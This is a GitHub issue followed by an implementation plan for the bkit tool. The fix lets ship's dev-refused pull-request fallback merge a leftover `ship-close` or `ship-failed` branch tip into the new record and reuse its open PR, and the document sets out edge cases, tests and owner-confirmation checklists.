## Session Prompt — this run's, newer than everything below

#1042 publish=false

## Issue description — oldest

### Narrative

When `dev` refuses ship's push, ship publishes its record through a pull request (PR) on a fixed branch: `ship-close/{fid}` for the success close today, and `ship-failed/{fid}` for the FAILED flush once #811 — Publish a dev-refused ship FAILED flush through a ship-close PR (https://github.com/cbartens/bkit/issues/811) lands. If an earlier attempt for the same feature left that branch on origin, the next attempt cannot push to it, and the record does not land. Each claim below was checked against `dev` at `2891aff42` and against build 811's worktree (`.worktrees/811-publish-dev-refused`, branch `feat/811-publish-dev-refused`) at `0b2c201e1`. The 811 line numbers move once it lands.

**What the push does.** `pushToDev` in `.bkit/core/engine/commands/land.ts` (line 221) builds the record commit in a throwaway checkout detached at a fresh `origin/dev`. When the server refuses the push to `dev`, it calls the caller's `refused` handler on that checkout (line 256). Both callers' handlers call `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts` (line 1434 on `dev`, line 1488 in 811). `closePr` pushes with a plain `git push origin HEAD:refs/heads/{branch}` (line 1441 on `dev`, line 1495 in 811). A plain push only fast-forwards: it is accepted only when the branch tip already on origin is an ancestor of the new commit.

**Why a leftover branch breaks it.** The new commit sits on today's `dev`. A leftover tip is a record commit built on an older `dev`, so it is never an ancestor of the new commit, and origin rejects the push as non-fast-forward. A branch is left behind in three ways:

<!-- prettier-ignore -->
| How the branch is left | Why it stays |
| --- | --- |
| The PR opened but did not merge | `mergePr` (`.bkit/core/engine/commands/workflow/prs.ts` line 580) fails, for example because `dev` requires a review or a status check. `closePr` logs "opened but not merged — merge it by hand" and returns `close-pr-open`. |
| `gh pr create` failed after the branch push | `closePr` returns `gh pr create failed: …`; the branch is already on origin with no PR. |
| The PR merged but the branch was not deleted | `mergePr` squash-merges (`--squash`, line 699) with `--delete-branch` (line 701). A squash commit is a new commit, so even a merged tip is not an ancestor of `dev`. A failed delete, or a hand merge with "Automatically delete head branches" off, leaves the tip. |

Even when the push goes through, `closePr` always runs `gh pr create`, which fails while an open PR for that branch already exists.

**What a failed publish costs.**

- **Success close (`dev` today).** `shipClose` (line 1478) takes the failure from its `refused` handler (lines 1511-1514), logs `close branch push failed — close bookkeeping kept in {book}` and exits 11 (`EXIT_FLUSH_FAILED`, line 175). The lock stays held for the Failure Path.
- **FAILED flush (811).** `landFailedRecord` (line 718) passes a `refused` handler for `--flush` (`viaPr: true`, lines 936-944) that calls `closePr` with `branch: ship-failed/${o.fid}` (lines 761-772). When `closePr` fails, the `refused` case (lines 818-826) returns `stop(EXIT_PUSH_FAILED, …)`: exit 10, with the log line `dev refused the push: …; the PR path failed too: close branch push failed for ship-failed/{fid} — ship FAILED record kept in {book} — the next ship of {fid} carries it`. On a laptop the next run carries the record. A cloud runner throws its machine away, so the FAILED record is lost. Publishing that record from a cloud runner is the reason #811 exists.

Build 811's challenge raised this as `TASK 1` in `docs/plans/202611/logs/811-publish-dev-refused/build-challenge-1.md` (MEDIUM, architectural, `workflows.ts:1495`). The run accepted it for now: `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept` records an orchestrator assumption, which the owner can overturn.

**The fix: build the new record on top of the leftover tip.** Before it pushes, `closePr` checks whether origin already holds the branch. If it does, `closePr` merges that tip into the new record commit in the throwaway checkout. The leftover tip is then an ancestor, so the plain push is a fast-forward. If an open PR for the branch exists, `closePr` reuses it and skips `gh pr create`. This needs no force push, no branch deletion and no new branch name. The three candidates:

<!-- prettier-ignore -->
| Candidate | What it costs | Covers |
| --- | --- | --- |
| (a) Merge the leftover tip into the new commit; reuse an open PR | One merge commit on the PR branch. The squash merge flattens it, so `dev` still gets one commit. A clash between the two records needs a rule (below). | All three leftover cases. An unmerged earlier record is carried forward, not dropped. |
| (b) Delete the remote branch when its PR merged, then push fresh | Squash merges hide whether a tip is merged, so this needs a `probePr` (`prs.ts` line 94) call with `state: "all"` and a match of the merged PR's `headRefOid` to the tip. A plain `git push origin --delete` races with any push between that check and the delete. The race-free form, a delete leased on the proved tip (as `deleteBranch` does in `.bkit/core/engine/commands/workflow/worktrees.ts`, lines 943-949), carries `--force-with-lease`. | The merged-not-deleted case only. In the other two cases the branch may hold the only copy of an earlier record, so deleting it loses that record. |
| (c) A branch name per attempt | Departs from the fixed `ship-failed/{fid}` in #811's body and from `ship-close/{FID}` in `.bkit/core/.bkit/workflows.md` § `/bkit-ship` — 12 steps and § Consumer rollback path, and in `docs/deployments.md` § Consumer rollback path. An unmerged PR stays open next to the new one, so a person merges both. With auto-delete off, branches pile up. | All three cases, but an earlier unmerged record is never carried forward. |

(a) is recommended. It is the only candidate that meets both constraints, the rules' git limits and #811's fixed branch name, and it covers every case. On the rules: `.agents/rules.md` § Destructive git forbids `git push --force` (any flavour), and § Force push allows only `--force-with-lease` and only on a personal branch. No rule says whether a bkit-owned `ship-close/` or `ship-failed/` branch counts as personal. (a) uses neither, so that question does not block this fix. A plain `git push origin --delete` is not on the forbidden list, but (a) does not need it either.

**Clash rule for (a).** `closePr` runs `git merge --no-commit -X ours {tip}`. `-X ours` settles a clashing hunk in favour of the new record: for a same-named log file in the run's log folder, the newer attempt's text wins. Before the merge commit, ledger rows that only the leftover tip added are put back with the approach `restoreBranchRows` in `.bkit/core/engine/commands/workflow/branches.ts` (line 2817) already uses for the design and plan close's `-X ours` squash (line 2852). So no earlier row is lost, whichever merge driver git picks for a file. A leftover tip that changes a file outside the bookkeeping paths is refused before any merge. It is checked with `minPushOutside` and `minPushPathspecs` (`.bkit/core/engine/commands/ci/ci.ts`, lines 640 and 611), the same check `checkLanding` (`land.ts` line 187) runs on every landing, so a PR branch someone pushed code onto is never merged into a record.

### Success Criteria

- A refused ship FAILED flush lands its record through the `ship-failed/{fid}` PR and exits 0 when origin already holds that branch, whichever of the three ways left it.
- A refused ship close lands through the `ship-close/{fid}` PR and exits 0 when origin already holds that branch.
- An open PR for the branch is reused: no second `gh pr create`, and `mergePr` gets `--match-head-commit` set to the pushed tip.
- Every ledger row and every log file name the leftover tip held is still on the branch after the push.
- A leftover tip that changes a file outside the min-push paths is not merged: the branch on origin is unchanged, the failure reason names the branch and the outside paths, and the exit code is the same as for any other PR-path failure today (10 for the flush, 11 for the close).

### Edge Cases

<!-- prettier-ignore -->
| Scenario | Expected Behavior |
| --- | --- |
| No branch on origin | As today: push, `gh pr create`, merge. |
| Leftover branch with an open PR (earlier merge failed) | Tip merged in, fast-forward push, the open PR is reused, merge tried once. |
| Leftover branch with an open PR whose merge fails again | `close-pr-open`, exit 0: the record is on the branch, as in today's open-PR outcome. |
| Leftover branch with no PR (earlier `gh pr create` failed) | Tip merged in, fast-forward push, one `gh pr create`. |
| Leftover branch whose PR was squash-merged | Tip merged in. Its changes are already on `dev`, so the PR adds only the new record. A union-merged ledger may hold a duplicate line, which the reader's fold removes (`.gitattributes` header). |
| Leftover branch whose PR was closed unmerged | `probePr` never picks a closed PR, so a new PR is created on the same branch, carrying the earlier record. |
| Leftover tip changes a file outside the min-push paths | Not merged; failure names the branch and paths; branch unchanged; record kept in the book. |
| The merge stops on a clash `-X ours` cannot settle (modify/delete, binary) | Failure names the branch and tip; nothing pushed; the throwaway checkout is dropped as on every path. |
| The branch moves on origin between the read and the push | Push rejected; reported as a branch push failure, as today. |
| `git ls-remote` cannot reach origin | Failure `cannot read origin's {branch}`; nothing pushed. |
| `handover --push` from a shared checkout (`viaPr: false`) | Unchanged: no `refused` handler, no PR. |

### Derived Test Matrix

<!-- prettier-ignore -->
| Test description | Type | Target file |
| --- | --- | --- |
| --flush refused by dev twice for one FID publishes the second record through a PR | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` |
| --flush refused by dev with ship-failed left on origin and no PR opens one PR on that branch | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` |
| --flush refused by dev with a squash-merged ship-failed tip left on origin lands the new record | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` |
| --flush refused by dev does not merge a leftover tip that changes code | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` |
| a second refused close for one FID reuses the open ship-close PR | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` |

### Tasks

<!-- bkit:group 1 start -->
### TASK GROUP 1: Publish onto a branch an earlier attempt left

<!-- bkit:task 1 start -->
- [ ] **TASK 1:** Merge a leftover branch tip into the record and reuse its open PR
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: before the push, read the branch tip with `git ls-remote --exit-code origin refs/heads/{branch}` (exit 2 = no branch, as today; any other failure → `{ failed: "cannot read origin's {branch}" }`)
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: when a tip exists, fetch it, refuse it when `minPushOutside(dir, mergeBase, tip, minPushPathspecs(readBkitConfig(dir)))` lists any `outside` path (failure names the branch and the paths), then `git merge --no-commit -X ours {tip}`, put back the tip's ledger rows, and `git commit --no-edit`; a merge that stops on a clash returns `{ failed }` naming the branch and tip
  - **UPDATE:** `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts`: take `head` after the merge, so `mergePr` gets `--match-head-commit` set to the pushed tip; call `probePr(dir, { head: branch, base: DEV, state: "open" })` before `gh pr create`, and skip the create when it finds a PR
  - **UPDATE:** `restoreBranchRows` in `.bkit/core/engine/commands/workflow/branches.ts` (line 2817): export it so `closePr` reuses it instead of a second copy; its `branch` argument is any revision, and it must run while `MERGE_HEAD` is set (after `--no-commit`, before the commit), because once the merge commit exists, the merge base with the tip is the tip itself
  - **UPDATE:** the `closePr` doc comment: says it builds on a branch an earlier attempt left
  - **READ:** `pushToDev` in `.bkit/core/engine/commands/land.ts` (line 221): the `refused` handler runs inside `withoutHooks`, so the merge commit runs no hook, and the throwaway checkout is dropped on every path
  - **READ:** `shipClose` and `landFailedRecord` in `.bkit/core/engine/commands/workflow/workflows.ts`: neither needs a change; both already map `{ failed }` to their exit code
  - **DONE WHEN:** `pnpm vitest run .bkit/core/engine/commands/workflow/workflows.test.ts .bkit/core/engine/commands/workflow/branches.test.ts` passes, the existing tests `closePr with base dev still merges`, `closePr refuses when the PR base is unknown` and 811's `--flush refused by dev publishes the FAILED record through a PR` pass unchanged, and `pnpm build && git add dist/` has run
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev twice for one FID publishes the second record through a PR` fails on the second flush exiting 10 with `close branch push failed for ship-failed/{FID}`. 811's file-scope `ghStub` gains two options: `pr list` answers `[]` until `pr create` has run, and `pr merge` can exit 1. The first flush leaves an open PR. The second flush, with a new ledger row, must exit 0 with `pushed: true`, the first tip must be an ancestor of the new tip on the remote, both rows must be on the branch, and the calls must show one `pr create`.
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with ship-failed left on origin and no PR opens one PR on that branch` fails on exit 10. It pushes a FAILED record commit to `ship-failed/{FID}` on the bare remote from an older `dev`, then flushes. It expects exit 0, one `pr create --head ship-failed/{FID}`, and the earlier record's log file still on the branch tip.
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with a squash-merged ship-failed tip left on origin lands the new record` fails on exit 10. The leftover tip's change is also committed to `dev` as a separate commit, which is what a squash merge looks like. It expects exit 0 and `git diff dev ship-failed/{FID} --name-only` on the remote to list only files the new record wrote.
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that changes code` fails on its expected reason being missing from the log. The leftover tip changes `src/app.ts`. It expects exit 10, a log naming `ship-failed/{FID}` and `src/app.ts`, and the remote branch still at the leftover tip.
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `a second refused close for one FID reuses the open ship-close PR` (inside `describe("close PR (dev refused the push)")`) fails on exit 11 with `close branch push failed for ship-close/{FID}`. It puts a leftover tip on `ship-close/{FID}`, and its stub's `pr list` answers an open PR. It expects exit 0, `landed.ref` = `ship-close/{FID}`, and no `pr create` call.
<!-- bkit:task 1 end -->

<!-- bkit:task 2 start -->
- [ ] **TASK 2:** Say that ship's PR fallback builds on a branch an earlier attempt left
  - **UPDATE:** `.bkit/core/.bkit/workflows.md` § `/bkit-ship` — 12 steps (the close bullet, line 1126 on `dev`) and § Consumer rollback path (line 1352): a `ship-close/{FID}` or `ship-failed/{FID}` branch already on origin is merged into the new record, and its open PR is reused
  - **UPDATE:** `.bkit/core/.bkit/workflows.md`: the three `--flush` → `ship-failed/{FID}` PR lines 811 adds (two in § Tracker Blocks, one in § Failure Path) get the same clause
  - **UPDATE:** `docs/deployments.md` § Consumer rollback path (line 349) and the `ship-failed/{FID}` sentence 811 adds to § Autonomous phase-close prerequisites: the same clause
  - **UPDATE:** `docs/testing.md` § Key test files: the `commands/workflow/workflows.test.ts` row (line 828) adds the leftover-branch PR fallback for close and flush
  - **UPDATE:** `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept`: append a same-`key` row with `status: "SUPERSEDED"` through `bkit ledgers append` (`.bkit/jsonl.md` § Write Idiom), naming this issue
  - **DEPENDS ON:** 1
  - **DONE WHEN:** no line in those files says a refused close or flush fails when its branch is already on origin, and `pnpm tsx .bkit/core/engine/cli.ts upgrade` has re-rendered `.bkit/workflows.md`
  - **TEST FIRST:** n/a — docs and a ledger row only
<!-- bkit:task 2 end -->
<!-- bkit:group 1 end -->

### Open Questions & Assumptions

- Assumption: a PR someone closed unmerged on a `ship-close/` or `ship-failed/` branch is not a signal to discard its record. Records are append-only, so the next publish carries it. Deleting the branch is how a person discards it.
- Assumption: `-X ours` plus the ledger-row put-back is enough. A log file with the same name in both attempts keeps the newer attempt's text, which is the file the newer run rewrote.
- No owner question remains. (a) needs neither a force push nor a new branch name, so it does not force the trade-off the 811 decision row describes.

Removes: the unconditional `gh pr create` in `closePr`, which fails whenever an open PR already exists for the branch, and the accepted limit recorded as `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept`. No code path is deleted beyond that, because the fallback keeps its shape and only gains the leftover-tip step.

### Breaking Changes & Naming

None. Branch names, exit codes and output fields stay as they are. `restoreBranchRows` becomes an export of `.bkit/core/engine/commands/workflow/branches.ts`.

### Out of Scope

- Deleting leftover branches, or pruning old ones.
- Whether a bkit-owned PR branch counts as a personal branch under `.agents/rules.md` § Force push.
- Pre-flighting the `dev` review and status-check rules that make a close PR's merge fail (`docs/deployments.md` § Autonomous phase-close prerequisites).

### References

- #811 — Publish a dev-refused ship FAILED flush through a ship-close PR, https://github.com/cbartens/bkit/issues/811
- `docs/plans/202611/logs/811-publish-dev-refused/build-challenge-1.md` (on `feat/811-publish-dev-refused`), `TASK 1`
- `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept`
- `.bkit/core/engine/commands/workflow/workflows.ts` (`closePr` line 1434, `shipClose` line 1478; in 811 `landFailedRecord` line 718, `closePr` line 1488)
- `.bkit/core/engine/commands/land.ts` (`pushToDev` line 221, `checkLanding` line 187)
- `.bkit/core/engine/commands/workflow/prs.ts` (`probePr` line 94, `mergePr` line 580)
- `.bkit/core/engine/commands/workflow/branches.ts` (`restoreBranchRows` line 2817, `buildClose` `-X ours` squash line 2852)
- `.bkit/core/engine/commands/ci/ci.ts` (`minPushPathspecs` line 611, `minPushOutside` line 640)
- `.agents/rules.md` § Destructive git and § Force push

###### bkit:blocked-by start
- #811
###### bkit:blocked-by end

## Issue comment — posted 2026-11-18T04:23:53.000Z

Build 811 has landed on local `dev` as `fa7b9af16`, so this issue is no longer blocked by it once `dev` is pushed.

Two LOW findings from that build's review sit in the same code and are best closed with this issue. Both are open rows in `docs/deferrals.jsonl`:

- `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-1509`: when `gh pr create` fails after the branch push, the failure reason does not name the `ship-failed/{FID}` branch that origin already holds.
- `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-830`: a flush whose PR opened but did not merge links the tracker comment at the branch, and that link dies once the owner merges the PR and GitHub deletes the branch.

## Plan — docs/plans/202611/1042-ship-s-pr-plan.md — last committed 2026-11-19T21:56:45.000Z

# Ship's PR fallback builds on a branch an earlier attempt left Implementation Plan

> [!CAUTION]
> **Purpose:** The implementation plan: pre-flight checks, gates, the runbook, verification and rollback.

## Context & Goals

When `dev` refuses ship's push, ship publishes its record through a PR on a fixed branch (`ship-close/{fid}` for the close, `ship-failed/{fid}` for the FAILED flush). If an earlier attempt left that branch on origin, `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts` cannot push to it (a plain push is not a fast-forward) and the record does not land. The fix is to merge the leftover tip into the new record commit before the push, and to reuse an open PR for the branch instead of running `gh pr create` again. Two open LOW deferrals from build 811 in the same code are folded in: the failure reason after a failed `gh pr create` names the pushed branch (`...-1509`), and a flush whose PR opened but did not merge links the tracker comment at the pushed record commit, so the link opens before the merge and after GitHub deletes the branch (`...-830`).

**Related Issues:**

- #1042 — Ship's PR fallback builds on a branch an earlier attempt left (this issue)
- #811 — Publish a dev-refused ship FAILED flush through a ship-close PR (landed on local `dev` as `fa7b9af16`)

---

## 👤 ⚠️ Acceptance Scenario

> [!CAUTION]
> 🛑 The owner reads and confirms this section.
> This is the feature's testable contract. The implementation, the tests and the verification all follow from what you confirm here, so a mistake here carries into every later step.
>
> **You only need 👤-marked sections** (Acceptance Scenario, Breaking Changes, Open Questions & Assumptions). The agent handles the rest.

### Narrative

When `dev` refuses ship's push and origin already holds `ship-close/{fid}` or `ship-failed/{fid}` from an earlier attempt, ship merges that leftover tip into the new record, pushes as a fast-forward, reuses an open PR if there is one and lands the record. The run exits 0 instead of 10 (flush) or 11 (close).

### Success Criteria

- A refused ship FAILED flush lands its record through the `ship-failed/{fid}` PR and exits 0 when origin already holds that branch, whichever of the three ways left it.
- A refused ship close lands through the `ship-close/{fid}` PR and exits 0 when origin already holds that branch.
- An open PR for the branch is reused: no second `gh pr create`, and `mergePr` gets `--match-head-commit` set to the pushed tip.
- Every ledger row and every log file name the leftover tip held is still on the branch after the push.
- A leftover tip that changes a file outside the min-push paths is not merged: the branch on origin is unchanged, the failure reason names the branch and the outside paths, and the exit code is the same as for any other PR-path failure today (10 for the flush, 11 for the close).

### Process Sketch

- **WHEN** a refused flush or close finds no `{branch}` on origin **→ THEN** it pushes, runs `gh pr create` and merges, as today.
- **WHEN** it finds a leftover tip within the min-push paths **→ THEN** it merges the tip with `-X ours`, puts back the tip's ledger rows, commits, pushes as a fast-forward, reuses an open PR (or creates one when none exists) and merges with `--match-head-commit` at the pushed tip.
- **WHEN** a refused flush's PR opened but did not merge **→ THEN** the handover comment links the file at the pushed record commit's SHA (`blob/{sha}/...`), which opens before the merge and, through GitHub's `refs/pull/N/head`, after the head branch is deleted; a merged PR still links at `dev`.
- **IF** the leftover tip changes a file outside the min-push paths **→ THEN** nothing is merged or pushed, and the failure names the branch and the paths.
- **IF** the merge stops on a clash `-X ours` cannot settle, or `git ls-remote` cannot reach origin **→ THEN** nothing is pushed and the failure names the branch (and the tip, for a clash).

### Concrete Example

**Setup:** A cloud runner ships feature `12-export-csv`. `dev` refuses the push. An earlier FAILED flush left `ship-failed/12-export-csv` on origin with an open PR whose merge failed.

**Steps:**

1. The runner runs `bkit workflows handover --workflow=ship --flush` → `dev` refuses the push, so `closePr` reads origin's `ship-failed/12-export-csv` tip.
2. `closePr` merges that tip into the new record commit and pushes → the push is a fast-forward.
3. `closePr` finds the open PR and skips `gh pr create` → it merges the PR pinned to the pushed tip.

**Outcome:** Exit 0 with `pushed: true`. Both the earlier and the new record are on the branch, and one PR carries them.

### Edge Cases

<!-- prettier-ignore -->
| Scenario | Expected Behavior |
| --- | --- |
| No branch on origin | As today: push, `gh pr create`, merge. |
| Leftover branch with an open PR (earlier merge failed) | Tip merged in, fast-forward push, the open PR is reused, merge tried once. |
| Leftover branch with an open PR whose merge fails again | `close-pr-open`, exit 0: the record is on the branch, as in today's open-PR outcome. |
| Leftover branch with no PR (earlier `gh pr create` failed) | Tip merged in, fast-forward push, one `gh pr create`. |
| Leftover branch whose PR was squash-merged | Tip merged in. Its changes are already on `dev`, so the PR adds only the new record. A union-merged ledger may hold a duplicate line, which the reader's fold removes (`.gitattributes` header). |
| Leftover branch whose PR was closed unmerged | `probePr` never picks a closed PR, so a new PR is created on the same branch, carrying the earlier record. |
| Leftover tip changes a file outside the min-push paths | Not merged; failure names the branch and paths; branch unchanged; record kept in the book. |
| The merge stops on a clash `-X ours` cannot settle (modify/delete, binary) | Failure names the branch and tip; nothing pushed; the throwaway checkout is dropped as on every path. |
| The branch moves on origin between the read and the push | Push rejected; reported as a branch push failure, as today. |
| `git ls-remote` cannot reach origin | Failure `cannot read origin's {branch}`; nothing pushed. |
| `gh pr create` fails after the branch push | The failure reason names the pushed branch, so the exit log says the record is on that branch with no PR (folded in from deferral `...workflows-ts-1509`). |
| A flush's PR opened but did not merge | The handover comment links at the pushed record commit's SHA, not at the branch; it opens now and after the owner merges and GitHub deletes the branch. A merged PR links at `dev`, as today (folded in from deferral `...workflows-ts-830`). |
| `handover --push` from a shared checkout (`viaPr: false`) | Unchanged: no `refused` handler, no PR. |

### Derived Test Matrix

`Type` is a tier from `docs/testing.md`: Static, Unit, Integration, @live (golden), E2E, fresh-DB replay or Smoke. `Task` is the one runbook task that lands the row's test.

<!-- prettier-ignore -->
| Test description | Type | Target file | Task |
| --- | --- | --- | --- |
| --flush refused by dev twice for one FID publishes the second record through a PR | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev with ship-failed left on origin and no PR opens one PR on that branch | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev with a squash-merged ship-failed tip left on origin lands the new record | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev does not merge a leftover tip that changes code | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| a second refused close for one FID reuses the open ship-close PR | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev with gh pr create failing names the pushed ship-failed branch | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev links the handover comment at the pushed commit when the PR did not merge | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 2 |
| --flush refused by dev keeps the unmerged handover link readable after the branch is deleted | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 2 |
| --flush refused by dev does not merge a leftover tip that adds a symlinked ledger | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 4 |
| restoreBranchRows writes nothing through a symlinked ledger | Unit | `.bkit/core/engine/commands/workflow/branches.test.ts` | 4 |
| --flush refused by dev with a fork PR on the ship-failed branch name opens its own PR | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 5 |
| --flush refused by dev onto a leftover ship-failed branch keeps the skip token on the pushed head | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 6 |
| a second refused close waits for the reused PR head to reach the pushed tip before merging | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 7 |
| --flush refused by dev does not merge a leftover tip that adds a skill | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 8 |
| --flush refused by dev does not merge a leftover tip that writes .bkit/issues.jsonl | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 8 |
| --flush refused by dev runs the landing gate on a merged leftover tip | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 9 |

### 👤 ✅ Human Confirmation

- [ ] **Acceptance Scenario confirmed:** I have reviewed the Narrative, Success Criteria, Process Sketch, Concrete Example, Edge Cases, and Derived Test Matrix above. They correctly describe what "done" looks like.

---

## 👤 ⚠️ Breaking Changes & Naming Review

> [!CAUTION]
> 🛑 The owner reads and confirms this section.

None. Branch names, exit codes and output fields stay as they are. `restoreBranchRows` becomes an export of `.bkit/core/engine/commands/workflow/branches.ts`.

### 👤 ✅ Human Confirmation

- [ ] **Breaking Changes confirmed:** I have reviewed every breaking change and naming decision above.

---

## 👤 ⚠️ Open Questions & Assumptions

> [!CAUTION]
> 🛑 The owner reads and confirms this section.
> These are the unknowns and assumptions this plan relies on. An unresolved question is a risk, and a wrong assumption breaks what follows. **If** there are none → write `None`.

- **Assumption:** a PR someone closed unmerged on a `ship-close/` or `ship-failed/` branch is not a signal to discard its record. Records are append-only, so the next publish carries it → deleting the branch is how a person discards it; if the owner wants closed-PR records dropped, the fix changes.
- **Assumption:** `-X ours` plus the ledger-row put-back is enough. A log file with the same name in both attempts keeps the newer attempt's text, which is the file the newer run rewrote → an older attempt's text would be lost if the newer run did not rewrite it.
- No owner question remains. Candidate (a) needs neither a force push nor a new branch name, so it does not force the trade-off the 811 decision row describes.

### 👤 ✅ Human Confirmation

- [ ] **Open Questions & Assumptions confirmed:** I have resolved or explicitly accepted every open question and assumption above.

---

## Alternative Approaches & Recommendations

Chosen: (a) merge the leftover tip into the new commit and reuse an open PR. Rejected:

- (b) Delete the remote branch when its PR merged, then push fresh: squash merges hide whether a tip is merged, so it needs a `probePr` with `state: "all"` and a `headRefOid` match; a race-free delete carries `--force-with-lease`; it covers only the merged-not-deleted case and loses a record held only on the branch in the other two cases.
- (c) A branch name per attempt: departs from the fixed names in `.bkit/core/.bkit/workflows.md` and `docs/deployments.md`, leaves an unmerged PR open next to the new one, and never carries an earlier unmerged record forward.

## Out of Scope

<!-- prettier-ignore -->
| Excluded item | Why `Exempt` | Where it belongs |
| --- | --- | --- |
| Deleting leftover branches, or pruning old ones | (a) needs no deletion; it only adds to the goal | A follow-up if branches pile up |
| Whether a bkit-owned PR branch counts as a personal branch under `.agents/rules.md` § Force push | (a) uses neither force push nor delete | An owner decision on the rule |
| Pre-flighting the `dev` review and status-check rules that make a close PR's merge fail | A separate check; it only adds to the goal | `docs/deployments.md` § Autonomous phase-close prerequisites |

## Suggested Scope Expansion

<!-- prettier-ignore -->
| Candidate | Source | Overlaps | Recommendation |
| --- | --- | --- | --- |
| `gh pr create` failure after the branch push does not name the pushed `ship-failed/{FID}` branch | `docs/deferrals.jsonl` key `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-1509`; the issue comment of 2026-11-18 | Task 1 (`closePr`'s `gh pr create` failure line) | Fold in (Task 1): one line in the code Task 1 already changes, one test row; Task 1 closes the deferral |
| A flush whose PR opened but did not merge links the tracker comment at the branch, and the link dies once GitHub deletes the branch | `docs/deferrals.jsonl` key `811-publish-dev-refused-challenge-low-bkit-core-engine-commands-workflow-workflows-ts-830`; the issue comment of 2026-11-18; the run's instructions | Task 2 (`closePr` returns the pushed SHA; `landFailedRecord` links at it) | In scope (Task 2): link at the pushed commit's SHA, which opens before the merge and after the branch is deleted; Task 2 closes the deferral |

## Security & Privacy

None — no new routes, DB writes, secrets, or user input. The merge reads a branch from origin, so a leftover tip that changes any file outside the min-push paths is refused before any merge (Task 1).

## Pre-Flight / Dependencies

### Core

- [ ] **Package Management:** no package changes.
- [ ] **Dependency Versions:** no dependency changes.
- [ ] **Existing-Solution Search (reuse over duplicate):** the in-repo searches are recorded in `Reuse Inventory`.
- [ ] **User Context:** access to the files is confirmed.
- [ ] **Project Context:** `docs/decisions.jsonl` key `811-leftover-ship-failed-branch-is-an-assumed-accept` and deferral rows `...-1509` and `...-830` are read.
- [ ] **Project Documents:** assessed through the `.agents/docs.md` index; each source is in `Documentation Consultation`.
- [ ] **Prerequisite Plans:** None. #811 has landed on local `dev` (`fa7b9af16`).

### Conditional

- [ ] **Deployments & Setup:** `docs/deployments.md` § Autonomous phase-close prerequisites and § Consumer rollback path are updated (Task 3).

### 🔒 Gate 1: Prerequisites Check

- [ ] **Acceptance Scenario confirmed:** the `👤 ⚠️ Acceptance Scenario` checkbox is `[x]`, ticked by a human.
- [ ] **Breaking Changes confirmed:** the `👤 ⚠️ Breaking Changes & Naming Review` checkbox is `[x]`, ticked by a human.
- [ ] **Open Questions confirmed:** the `👤 ⚠️ Open Questions & Assumptions` checkbox is `[x]`, ticked by a human.
- [ ] **Security & Privacy checked:** every applicable row is verified, or `None` is justified.
- [ ] **Reuse Inventory complete:** every capability has a row with `Search performed` and `Decision` filled in.
- [ ] **Reuse reasons:** every `NEW` row cites its reason.
- [ ] **Gate 1 — Verified:** every item above, every Core item and every applicable Conditional item is checked.

## Documentation Consultation

<!-- prettier-ignore -->
| Topic | Recommended path | Applies | Source used (path and section) | Coverage | Gap and action |
| --- | --- | --- | --- | --- | --- |
| architecture | `docs/architecture.md` | yes — engine commands | `docs/architecture.md` (searched for `closePr` and `ship-close`: no mention) | partial | The doc does not describe the PR fallback; no change needed, the fallback detail lives in `.bkit/core/.bkit/workflows.md` and `docs/deployments.md`. |
| technology | `docs/technology.md` | yes — conventions | `docs/technology.md` (searched for `closePr` and `ship-close`: no mention) | covered | None. |
| security | `docs/security.md` | yes — the merge takes in a branch from origin | `docs/security.md` (searched for `closePr` and `ship-close`: no mention); the min-push-paths check is the control | covered | None. |
| testing | `docs/testing.md` | yes — new tests | `docs/testing.md` § Key test files (the `commands/workflow/workflows.test.ts` row, line 965) | covered | Task 3 adds the leftover-branch PR fallback and the unmerged-link permalink to that row. |
